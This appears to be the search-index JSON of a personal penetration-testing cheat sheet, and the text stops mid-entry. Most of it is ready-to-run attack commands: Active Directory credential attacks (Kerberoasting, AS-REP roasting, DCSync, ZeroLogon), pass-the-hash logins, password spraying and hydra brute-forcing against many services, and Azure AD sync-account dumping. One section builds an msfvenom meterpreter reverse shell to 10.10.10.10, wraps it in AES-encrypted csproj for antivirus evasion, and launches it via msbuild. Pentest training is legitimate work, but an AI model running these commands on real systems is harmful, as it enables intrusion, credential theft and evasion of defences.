{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to Protyro's CheatSheet","text":"<p>This compilation includes my favorite strategies, tools, resources, courses I've followed, commands, reminders, and more.</p> <p>I'm not an expert, and I'm not claiming to be the best, but I'm committed to continuous learning. This cheat sheet is my way of organizing and sharing my knowledge.</p> <p>Check the reference section for a list of amazing resources that contributed to building this cheat sheet. All credits go to their respective authors.</p> <p> This cheat sheet is intended for use exclusively in accordance with applicable laws and ethical standards. Ensure that your actions align with legal and responsible practices. </p> <p>Happy hacking! </p> <p></p>"},{"location":"References/","title":"References","text":"<p>A list of amazing resources that helped me to learn pentesting and build this cheat sheet. All credits go to their authors.</p>"},{"location":"References/#template-and-documentation","title":"Template and Documentation","text":"<ul> <li>https://github.com/vjeantet/hugo-theme-docdock/</li> <li>https://docdock.netlify.app/</li> </ul>"},{"location":"References/#pentesting-in-general","title":"Pentesting in general","text":"<ul> <li>https://book.hacktricks.xyz/</li> <li>https://github.com/swisskyrepo/PayloadsAllTheThings</li> <li>https://cs.piosky.fr/</li> <li>https://www.ired.team/</li> <li>https://vulp3cula.gitbook.io/hackers-grimoire/</li> </ul>"},{"location":"References/#active-directory","title":"Active Directory","text":"<ul> <li>https://zer1t0.gitlab.io/posts/attacking_ad/</li> </ul>"},{"location":"References/#network","title":"Network","text":"<ul> <li>https://danielmiessler.com/study/tcpdump/</li> </ul>"},{"location":"References/#wi-fi","title":"Wi-Fi","text":"<ul> <li>https://github.com/koutto/pi-pwnbox-rogueap/wiki/</li> </ul>"},{"location":"References/#web","title":"Web","text":"<ul> <li>https://portswigger.net/web-security</li> <li>https://owasp.org/www-project-web-security-testing-guide/</li> </ul>"},{"location":"References/#scripting","title":"Scripting","text":"<ul> <li>https://docs.python.org/3/tutorial/</li> </ul>"},{"location":"References/#certification-oriented","title":"Certification Oriented","text":"<p>OSCP</p> <ul> <li>https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/</li> <li>https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html</li> </ul>"},{"location":"References/#ctf","title":"CTF","text":"<ul> <li>https://www.hackthebox.com</li> <li>https://ippsec.rocks/?#</li> <li>https://www.root-me.org/</li> <li>https://tryhackme.com/</li> </ul>"},{"location":"References/#tips-and-tricks","title":"Tips and tricks","text":"<ul> <li>https://danielmiessler.com/study/vim/</li> </ul>"},{"location":"Active%20Directory/AD%20attacks/","title":"AD attacks","text":""},{"location":"Active%20Directory/AD%20attacks/#user-enumeration","title":"User enumeration","text":"<pre><code>kerbrute -d domain.local --dc $IP userenum /usr/share/seclists/Usernames/Names/names.txt\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#user-bruteforce-password","title":"User bruteforce password","text":"<pre><code>kerbrute -d domain.local --dc $IP bruteuser /usr/share/seclists/Passwords/probable-v2-top12000.txt username\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#as_rep-roasting","title":"AS_REP Roasting","text":"<p><pre><code>impacket-GetNPUsers domain.local/ -dc-ip $IP -usersfile users.txt -format hashcat -out asrep-roasting.txt\n</code></pre> <pre><code>hashcat -m 18200 asrep-roasting.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p>"},{"location":"Active%20Directory/AD%20attacks/#get-ad-users","title":"Get AD Users","text":"<pre><code>impacket-GetADUsers -hashes ':11628d378a956b8ffc7e2c54b9a59574' 'domain.com/user' -dc-ip 10.10.10.10 -all\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#get-users-description","title":"Get users description","text":"<pre><code>crackmapexec ldap $IP -u user -p 'Password1' --kdcHost $IP -M get-desc-users\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#kerberoasting","title":"Kerberoasting","text":"<ul> <li>Also work with machine account :)</li> </ul> <pre><code>impacket-GetUserSPNs -hashes ':11628d378a956b8ffc7e2c54b9a59574' 'domain.com/user' -dc-ip 10.10.10.10 -request -outputfile kerberoasting.hash\n</code></pre> <ul> <li>Kerberoasting without domain account</li> </ul> <pre><code>GetUserSPNs.py -no-preauth \"NO_PREAUTH_USER\" -usersfile \"LIST_USERS\" -dc-host \"dc.domain.local\" \"domain.local\"/\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#dc-sync","title":"DC Sync","text":"<pre><code>secretsdump.py 'contoso.local/Administrator@$IP' -just-dc-user krbtgt\n</code></pre>"},{"location":"Active%20Directory/AD%20attacks/#zerologon","title":"ZeroLogon","text":"<ul> <li>check CVE-2020-1472 : https://github.com/SecuraBV/CVE-2020-1472</li> <li>exploit CVE-2020-1472 : https://github.com/dirkjanm/CVE-2020-1472 <pre><code>python3 cve-2020-1472-exploit.py DCNAME $IP\n</code></pre></li> </ul>"},{"location":"Active%20Directory/AD%20attacks/#sam-the-admin","title":"SAM The Admin","text":"<p>exploit CVE-2021-42278 and CVE-2021-42287 : https://github.com/WazeHell/sam-the-admin <pre><code>python3 sam_the_admin.py \"domain.local\\user:Password1!\" -dc-ip $IP -shell\n</code></pre></p>"},{"location":"Active%20Directory/AD%20connect/","title":"AD connect","text":""},{"location":"Active%20Directory/AD%20connect/#using-smb-p445","title":"Using SMB (p445)","text":"<p>NTLM authentication </p> <ul> <li>with Pass-The-Hash (NT ou LM). <pre><code>psexec.py contoso.local/User@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21\n</code></pre> Kerberos authentication. Tickets format are different between Linux and Windows, ticket_converter or cerbero can be used to convert them. </li> <li>with TGT request using PtH <pre><code>getTGT.py contoso.local/User -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21\nexport KRB5CCNAME=$(pwd)/User.ccache\n\n# Hostname instead of IP is mandatory when connecting because it is used identify the service of the remote machine and provide the right ticket to authenticate against it.\npsexec.py contoso.local/User@WS01-10 -target-ip 192.168.100.10 -k -no-pass\n</code></pre></li> </ul>"},{"location":"Active%20Directory/AD%20connect/#using-powershell-remoting-p5985","title":"Using PowerShell Remoting (p5985)","text":"<ul> <li>PowerShell on Windows, use Rubeus or Mimikatz to PtH</li> </ul> <pre><code>.\\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt\nEnter-PSSession -ComputerName dc01\n</code></pre> <ul> <li>Evil-winrm on Linux, support PtH <pre><code>evil-winrm -u user -p password -i 10.10.10.10\nevil-winrm -u user -H &lt;NT_hash&gt; -i 10.10.10.10\n</code></pre></li> </ul>"},{"location":"Active%20Directory/AD%20connect/#using-rdp-p3389","title":"Using RDP (p3389)","text":"<p>PtH possible only if restricted admin mode for RDP is enabled. <pre><code>xfreerdp /u:Anakin@contoso.local /pth:cdeae556dc28c24b5b7b14e9df5b6e21 /v:192.168.122.14\n</code></pre> On Windows, PtH using mimikatz or Rubeus <pre><code>mstsc.exe /restrictedadmin\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/","title":"AD info","text":""},{"location":"Active%20Directory/AD%20info/#domain-name","title":"Domain name","text":"<p><pre><code># User domain\n$env:USERDNSDOMAIN\n(Get-ADDomain).DNSRoot\n</code></pre> <pre><code># Computer domain\n(Get-WmiObject Win32_ComputerSystem).Domain\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#domain-sid","title":"Domain SID","text":"<pre><code># Module AD\nGet-ADDomain | select DNSRoot,NetBIOSName,DomainSID\n# PowerView\nGet-DomainSID\n</code></pre>"},{"location":"Active%20Directory/AD%20info/#forests","title":"Forests","text":"<p>Users of a domain in the forest can also access to the other domains. <pre><code>Get-ADForest\n</code></pre> Functional Modes <pre><code>(Get-ADForest).ForestMode\n(Get-ADDomain).DomainMode\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#trusts","title":"Trusts","text":"<p>The trust direction is the opposite to the access direction.  Incoming trusts allow users of your domain to access the other domain. If Domain A trusts Domain B, then Domain B can access the ressources of Domain B.</p> <p><pre><code>nltest /domain_trusts\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n\n// PowerView\nGet-DomainTrust -API\n</code></pre> Primary Domain attribute indicates the current domain.</p> <p>Trusts accounts (used to store the trust keys which are NT hash or Kerberos keys) <pre><code>Get-ADUser  -LDAPFilter \"(SamAccountName=*$)\" | select SamAccountName\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#users-accounts","title":"Users accounts","text":"<p><pre><code>Get-ADUser User\n</code></pre> <pre><code>net user /domain\n</code></pre> Each computer of the domain has its own user stored as computer class (subclass of user class).</p> <pre><code># Retrieve all users of the domain including computers and trusts\nGet-ADObject -LDAPFilter \"objectClass=User\" -Properties SamAccountName | select SamAccountName\n</code></pre>"},{"location":"Active%20Directory/AD%20info/#groups","title":"Groups","text":"<p><pre><code>Get-ADGroup -Filter * | select SamAccountName\n</code></pre> <pre><code>Get-ADGroup \"Domain Admins\" -Properties members,memberof\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#domain-controllers","title":"Domain Controllers","text":"<p>Database location <pre><code>C:\\Windows\\NTDS\\ntds.dit\n</code></pre></p> <p>Discovery <pre><code>nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local\n</code></pre> <pre><code>nltest /dclist:contoso.local\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#computers-discovery","title":"Computers discovery","text":"<p><pre><code>ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D \"anakin@contoso.local\" -b \"dc=contoso,dc=local\" \"(objectclass=computer)\" \"DNSHostName\" \"OperatingSystem`\n</code></pre> <pre><code>nbtscan 192.168.100.0/24\n</code></pre> <pre><code>ntlm-info smb 192.168.100.0/24\n</code></pre> nmap <pre><code>nmap --script nbstat -p137 192.168.100.0/24\nnmap -p135 192.168.100.0/24\nnmap -p139 192.168.100.0/24\n</code></pre></p>"},{"location":"Active%20Directory/AD%20info/#bloodhound","title":"BloodHound","text":"<p>Collectors : - https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</p> <p><pre><code>. .\\SharpHound.ps1\nInvoke-bloodhound -CollectionMethod All\n</code></pre> <pre><code>neo4j console\n./BloodHound --no-sandbox\n</code></pre></p>"},{"location":"Active%20Directory/AD%20pivot/","title":"AD pivot","text":""},{"location":"Active%20Directory/AD%20pivot/#pivot-with-local-user","title":"Pivot with local user","text":"<pre><code>crackmapexec smb ad_hosts.txt -u administrator -H '11628d378a956b8ffc7e2c54b9a59574' --local-auth --continue-on-success\n</code></pre>"},{"location":"Active%20Directory/AD%20pivot/#pivot-with-domain-user","title":"Pivot with domain user","text":"<pre><code>crackmapexec smb ad_hosts.txt -d domain.com -u user -p password --continue-on-success\n</code></pre>"},{"location":"Active%20Directory/AD%20pivot/#password-spray-username-as-password","title":"Password spray - username as password","text":"<pre><code>crackmapexec smb ad_hosts.txt -d domain.com -u ad_user.txt -p ad_user.txt --continue-on-success --no-buteforce\n</code></pre>"},{"location":"Active%20Directory/Azure%20AD/","title":"Azure AD","text":""},{"location":"Active%20Directory/Azure%20AD/#overview","title":"Overview","text":"Active Directory Azure AD LDAP REST API'S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO's Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests"},{"location":"Active%20Directory/Azure%20AD/#unauthenticated","title":"Unauthenticated","text":"<p>If managed in output, target is using Azure AD.</p> <pre><code>https://login.microsoftonline.com/getuserrealm.srf?login=username@domain.local&amp;xml=1\n</code></pre> <p>Verify email addresses (does not leave any trace in Azure AD logs):</p> <ul> <li>https://github.com/LMGsec/o365creeper</li> </ul> <p>Password spraying:</p> <ul> <li><code>Security Defaults</code> or <code>Conditional Access Policies</code> features prevent such attacks</li> <li>Produce a lot of \"Login Failure\" logs in Azure AD and are easily recognizable </li> </ul> <pre><code>Invoke-PasswordSprayEWS -ExchHostname outlook.office365.com -UserList emails.txt -Password 'Company2024!'\n</code></pre>"},{"location":"Active%20Directory/Azure%20AD/#authenticated","title":"Authenticated","text":"<p>o365recon uses the MSOnline PowerShell</p> <pre><code>PS C:\\o365recon-master&gt; Connect-MsolService\nPS C:\\o365recon-master&gt; powershell -ep bypass .\\o365recon.ps1 -outputfile output\n</code></pre> <p><code>-users_detailed</code> \ufb02ag can be used in order to query more information about users. If the LastDirSyncTime is empty, the account only exists in the cloud.</p> <p>List Azure AD roles and the members of these roles:</p> <ul> <li>https://gist.github.com/ciphertxt/2036e614edf4bf920796059017fbbc3d</li> </ul> <p>Gather the list of all email addresses:</p> <pre><code>PS C:\\&gt; Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName user@domain.onmicrosoft.c\nom -Password Company2024 -OutFile global-address-list.txt\nPS C:\\&gt; type .\\global-address-list.txt\n</code></pre> <p>Connect to Exchange Service to retrieve the AD username corresponding to the given email:</p> <pre><code>PS C:\\&gt; Get-ADUsernameFromEWS -EmailList emails.txt -ExchHostname outlook.office365.com -Remote\n</code></pre> <p>List users with multi-factor authentication (requires Azure AD administrators):</p> <pre><code>PS C:\\&gt; Connect-MsolService\nPS C:\\&gt; Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@\n{N=\"MFA Status\"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequ\nirements.State} else { \"Disabled\"}}} | export-csv mfaresults.csv\nPS C:\\&gt; type .\\mfaresults.csv\n</code></pre> <p>Best tool to exploit Azure AD:</p> <ul> <li>https://github.com/dirkjanm/ROADtools</li> <li>https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon</li> </ul> <p>Exploiting password hash synchronization (phs):</p> <p><code>MSOL_</code> (the sync account) has replication privileges on the domain.</p> <p>1) Find the server where Azure AD Connect is installed in description of the <code>MSOL_</code> user.</p> <pre><code>ldapsearch -H ldap://DC01.DOMAIN.COM:389 -D \"DOMAIN\\user\" -w \"password\" -b \"DC=DOMAIN,DC=COM\" '(descriptio\nn=*Azure*)' description\n</code></pre> <p>2) Dump the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync. This requires local administrator account or ADSync service account.</p> <ul> <li>Blog: https://blog.xpnsec.com/azuread-connect-for-redteam/</li> <li>PoC: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</li> </ul> <p>If a fully deployed SQL Server is used instead of SQL Server Express database, the connection string from the PoC must be replaced by the following: <code>\"Server=LocalHost;Database=ADSync;Trusted_Connection=True;\"</code></p> <p>To dump the credentials over network:</p> <ul> <li>https://github.com/dirkjanm/adconnectdump</li> </ul> <p>Or, by dumping LSASS \ud83d\udea9.</p> <p>3) DC Sync</p> <pre><code>python3 secretsdump.py DOMAIN/MSOL_xxxxxxx@DC01.domain.com\n</code></pre> <p>This account is also valid and highly-privileged in the cloud.</p>"},{"location":"Enumeration/Authentication/","title":"Authentication","text":""},{"location":"Enumeration/Authentication/#default-credentials","title":"Default credentials","text":"<ul> <li>Use google :  default password or search in documentation <li>Test admin, root, hostname of the box, user as password, empty password, default password...</li> <li>https://cirt.net/passwords</li> <li>https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials</li> <li>https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv</li> <li>Source code (if available)</li> <li>Stickers on network devices</li>"},{"location":"Enumeration/Authentication/#brute-force","title":"Brute force","text":"<ul> <li>https://book.hacktricks.xyz/brute-force</li> </ul> <p><pre><code>hydra -l admin -P passwords.txt -e nsr ssh://$IP:2222\nhydra -L users.txt -p Welcome01 -e nsr smb2://$IP\nhydra -l administrator -p admin -M windows_hosts.txt smb\nhydra -C creds.txt -M windows_hosts.txt smb\n</code></pre> <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/path/admin.php:user=^USER^&amp;pass=^PASS^:Incorrect\"\n\nhydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /path/admin.html\n</code></pre></p>"},{"location":"Enumeration/Authentication/#password-spraying","title":"Password spraying","text":"<ul> <li>Welcome01</li> <li>Password1</li> <li>Company1!</li> <li>Company2024</li> <li>Winter2024</li> </ul>"},{"location":"Enumeration/Authentication/#wordlist-crafting","title":"Wordlist crafting","text":"<pre><code>cewl -d 2 -m 8 --with-numbers -w out.txt http://www.website.com/\npw-inspector -h\n</code></pre> <p>Generate a user name list for brute force from first and last name :</p> <ul> <li>https://dzmitry-savitski.github.io/2020/04/generate-a-user-name-list-for-brute-force-from-first-and-last-name</li> </ul>"},{"location":"Enumeration/Exploit%20Searching/","title":"Exploit Searching","text":""},{"location":"Enumeration/Exploit%20Searching/#exploit-searching","title":"Exploit Searching","text":"<ul> <li> <p>locally, using searchsploit :  <pre><code>searchsploit --nmap nmap.xml\nsearchsploit product version\nsearchsploit -m 9999\nsearchsploit -x 9999\n</code></pre></p> </li> <li> <p>using google</p> <ul> <li>only product / service</li> <li>product/service version number</li> <li>add keywords such as exploit, pentesting, cve, github </li> </ul> </li> <li>using github : https://grep.app/</li> <li>using the CVE number : https://nvd.nist.gov/vuln/search</li> <li>using shodan : https://exploits.shodan.io/</li> <li>using exploit db : https://www.exploit-db.com/</li> <li>using packetstorm : https://packetstormsecurity.com/</li> <li>using vulners : https://vulners.com/</li> <li>using sploitus : https://sploitus.com/</li> </ul>"},{"location":"Enumeration/Exploit%20Searching/#version-identification","title":"Version identification","text":""},{"location":"Enumeration/Exploit%20Searching/#banner-grabbing","title":"Banner grabbing","text":"<p>Google the version of the service, it could help identify the OS version as well.</p> <pre><code>nc -nv &lt;target&gt; &lt;port&gt;\n</code></pre>"},{"location":"Enumeration/Services/","title":"Services","text":"<p>Don't forget to brute force the services.</p>"},{"location":"Enumeration/Services/#tcp-21-ftp","title":"TCP 21 - FTP","text":"<p><pre><code>wget -r ftp://anonymous:password@$IP/\n</code></pre> <pre><code># for Active mode\nftp -A $IP \n</code></pre></p> <p>Quick bf : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</p> <pre><code>while read line; do echo $line |cut -d ':' -f 1 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt &gt; users.txt &amp;&amp; while read line; do echo $line |cut -d ':' -f 2 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt &gt; passwords.txt\n\nhydra -L users.txt -P passwords.txt -e nsr -t 16 ftp://$IP\n</code></pre>"},{"location":"Enumeration/Services/#tcp-22-ssh","title":"TCP 22 - SSH","text":"<p>User enumeration OpenSSH &lt; 7.7 : https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py</p> <pre><code>./ssh-username-enum.py $IP -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n</code></pre> <pre><code>ssh -v user@$IP #check host key algorithm\n</code></pre> <p>Quick bf : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt</p> <pre><code>while read line; do echo $line |cut -d ':' -f 1 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt &gt; users.txt &amp;&amp; while read line; do echo $line |cut -d ':' -f 2 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt &gt; passwords.txt\n\nhydra -L users.txt -P passwords.txt -t 16 ssh://$IP\n</code></pre>"},{"location":"Enumeration/Services/#tcp-25-smtp","title":"TCP 25 - SMTP","text":"<pre><code>smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.1.95\n</code></pre>"},{"location":"Enumeration/Services/#tcp-79-finger","title":"TCP 79 - Finger","text":"<p><pre><code>finger @&lt;Victim&gt;       # List users logged on\nfinger admin@&lt;Victim&gt;  # Get info of user\nfinger user@&lt;Victim&gt;   # Get info of user\n</code></pre> - https://raw.githubusercontent.com/TheProtyro/SimpleScripts/main/FingerUserEnum.py</p> <p><pre><code>python3 FingerUserEnum.py $IP /usr/share/seclists/Usernames/Names/names.txt --threads 50\n</code></pre> MSF <pre><code>use auxiliary/scanner/finger/finger_users\n</code></pre></p>"},{"location":"Enumeration/Services/#tcp-110-pop3","title":"TCP 110 - POP3","text":"<ul> <li>Use telnet to connect, not netcat</li> </ul> <pre><code>telnet $IP 110\nCAPA    # to obtain the capabilities of the POP3 server.\n</code></pre> <ul> <li>https://www.shellhacks.com/retrieve-email-pop3-server-command-line/</li> </ul>"},{"location":"Enumeration/Services/#tcp-111-rpcbind","title":"TCP 111 - RPCBIND","text":"<pre><code>nmap -sSUC -p111 $IP -oA scans/rpc\n</code></pre>"},{"location":"Enumeration/Services/#udp-161-snmp","title":"UDP 161 - SNMP","text":"<p><pre><code>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://$IP\n</code></pre> <pre><code>snmp-check $IP -c public\n</code></pre> <pre><code>snmpwalk -v 2c -c community_string $IP 1.3.6.1 | tee dump.snmp\ngrep -E ' STRING:' dump.snmp\n</code></pre> MSF <pre><code>auxiliary/scanner/snmp/snmp_enum\n</code></pre></p>"},{"location":"Enumeration/Services/#tcp-38963632683269-ldap","title":"TCP 389,636,3268,3269 - LDAP","text":"<p><pre><code>nmap -n -sV --script \"ldap* and not brute\" $IP -oA ldapScripts\ngrep -i 'sam\\|pass\\|desc' ldapScripts.nmap\n</code></pre> <pre><code>ldapsearch -x -H ldap://$IP -s base namingcontexts\nldapsearch -x -H ldap://$IP -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\nldapsearch -x -H ldap://$IP -D '' -w '' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\nldapsearch -x -H ldap://$IP -D '&lt;DOMAIN&gt;\\&lt;username&gt;' -w '&lt;password&gt;' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\n</code></pre></p> <pre><code>ldapsearch -x -H ldap://$IP -D 'DOMAIN\\username' -w 'password' -b \"DC=domain,DC=local\" \"(sAMAccountName=user)\" description\n</code></pre>"},{"location":"Enumeration/Services/#tcp-443-https","title":"TCP 443 - HTTPS","text":"<pre><code>/opt/testssl.sh https://$IP/\n</code></pre> <ul> <li>https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</li> </ul>"},{"location":"Enumeration/Services/#tcp-445-smb","title":"TCP 445 - SMB","text":"<p><pre><code>crackmapexec smb $IP\nsmbclient -L //$IP/\n</code></pre> <pre><code>smbmap -H $IP -R # Get permissions\n</code></pre> <pre><code>mount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share\n</code></pre> <pre><code>nmap --script smb-enum-shares -p 445 $IP\n</code></pre> <pre><code>enum4linux -a $IP | tee scans/enum4linux.out\n</code></pre> Not safe : - Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010) - Microsoft Windows system vulnerable to remote code execution (MS08-067) <pre><code>nmap --script \"smb-vuln-*\" -p 139,445 $IP -oA scans/smb_vuln\n</code></pre> Test for SambaCry, RCE from a writable share in versions &gt;= 3.5 :</p> <p><pre><code>nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP\n</code></pre> Brute force using CME <pre><code>crackmapexec smb $IP -u users.txt -p pass.txt --continue-on-success\n</code></pre> Connect using RPC : <pre><code>rpcclient -U \"\" -N $IP\nrpcclient $&gt; enumdomusers\nrpcclient $&gt; querydispinfo\nrpcclient $&gt; enumdomgroups\nrpcclient $&gt; querygroup 0xRID\nrpcclient $&gt; querygroupmem 0xRID\nrpcclient $&gt; queryuser 0xRID\nrpcclient $&gt; enumprinters\n</code></pre></p>"},{"location":"Enumeration/Services/#tcp-1433-mssql","title":"TCP 1433 - MSSQL","text":"<p><pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;\n</code></pre> <pre><code>while read line; do echo $line |cut -d ':' -f 1 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt &gt; users.txt &amp;&amp; while read line; do echo $line |cut -d ':' -f 2 ; done &lt; /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt &gt; passwords.txt\n\nhydra -L users.txt -P passwords.txt -t 16 mysql://$IP\n</code></pre></p> <ul> <li>https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#sql-server</li> </ul> <pre><code>mssqlclient.py user:passwd@$IP\nSQL &gt; help\n</code></pre> <ul> <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution</li> </ul>"},{"location":"Enumeration/Services/#tcp-2049-nfs","title":"TCP 2049 - NFS","text":"<pre><code>showmount -e $IP\n</code></pre> <pre><code>mkdir mnt_folder\n\nsudo mount -o nolock -o vers=2 $IP:/home mnt_folder/       \n# /home directory is being shared and we can access it by mounting it. \n# -o nolock to disable file locking, which is often needed for older NFS servers. \n# -o vers=2  because it doesn't have any authentication or authorization.\n\ncd mnt_folder/ &amp;&amp; ls\n</code></pre> <ul> <li>Look the file permissions (uuid owner and gowner). We can try to add a local user, change its UUID to the one of the remote file, su to that user and try accessing the file or put files (e.g. ssh public key if home folder).</li> </ul> <pre><code>sudo adduser pwn\nsudo sed -i -e 's/&lt;uid pwn user&gt;/&lt;uid file perm&gt;/g' /etc/passwd      # change the uuid of the pwn user by the one that have permissions on the shared folder\n\nsu pwn\nid      # notice the uid that allow to access the shared folder\n</code></pre>"},{"location":"Enumeration/Services/#tcp-3306-mysql","title":"TCP 3306 - MYSQL","text":"<pre><code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP\n</code></pre>"},{"location":"Enumeration/Services/#tcp-3389-rdp","title":"TCP 3389 - RDP","text":"<pre><code>nmap -Pn -sV --script=rdp-vuln-ms12-020 -p 3389 $IP -oA scans/rdp_vuln\n</code></pre>"},{"location":"Enumeration/Services/#tcp-5800580159005901-vnc","title":"TCP 5800,5801,5900,5901 - VNC","text":"<pre><code>nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5800,5900 $IP\n</code></pre> <ul> <li>https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#vnc</li> </ul> <p>VNC passwd <pre><code>echo -n &lt;VNC Secret Key&gt; | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\n</code></pre></p> <p>Connect to VNC <pre><code>vncviewer [-passwd pass.txt] $IP::5900\n</code></pre></p>"},{"location":"Enumeration/Services/#tcp-54325433-postgresql","title":"TCP 5432,5433 - POSTGRESQL","text":"<pre><code>psql -U &lt;myuser&gt; # Open psql console with user\npsql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt; # Remote connection\npsql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt; # Remote connection\n</code></pre>"},{"location":"Enumeration/Services/#tcp-8009-apache-jserv-protocol-ajp","title":"TCP 8009 - Apache JServ Protocol (AJP)","text":"<p>CVE-2020-1938 : https://www.exploit-db.com/exploits/48143</p> <pre><code>nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP\n</code></pre>"},{"location":"Exploitation/Antivirus%20Evasion/","title":"Antivirus Evasion","text":""},{"location":"Exploitation/Antivirus%20Evasion/#dropengine","title":"DropEngine","text":"<ul> <li>https://github.com/s0lst1c3/dropengine</li> </ul> <p>Create shell.bin <pre><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.bin\n</code></pre></p> <p>Create csproj payload <pre><code>python3 dropengine.py --build \\\n--interface csharp_runner_interface \\\n--crypter crypter_aes \\\n--decrypter decrypter_csharp_rijndael_aes \\\n--ekey ekey_static \\\n--runner msbuild_csharp_runner \\\n--dkey dkey_csharp_static \\\n--executor executor_csharp_virtual_alloc_thread \\\n--mutator mutator_random_string \\\n--shellcode shell.bin \\\n--o example.csproj\n</code></pre></p> <p>Start the handler <pre><code>msfconsole -q -x 'use multi/handler; set payload windows/meterpreter_reverse_tcp; set lhost eth0; set lport 443; exploit'\n</code></pre></p> <p>Trigger the payload using msbuild</p> <ul> <li>https://lolbas-project.github.io/lolbas/Binaries/Msbuild/</li> </ul> <pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe .\\example.csproj\n</code></pre>"},{"location":"Exploitation/Exploits/","title":"Exploits","text":""},{"location":"Exploitation/Exploits/#convert-py2-to-py3","title":"Convert py2 to py3","text":"<pre><code>2to3 ms08_067_2018.py -w -n -o py3dir\n</code></pre>"},{"location":"Exploitation/Exploits/#switch-python-version","title":"Switch python version","text":"<p>If python2 still needed :</p> <ul> <li>https://www.kali.org/docs/general-use/using-eol-python-versions/</li> </ul> <pre><code>pyenv versions # show available versions \npyenv global 2.7.18 # set python to version 2.7.18\npyenv global system # # set python to default python3\n</code></pre>"},{"location":"Exploitation/Exploits/#compile-32bits-exploits","title":"Compile 32bits exploits","text":"<ul> 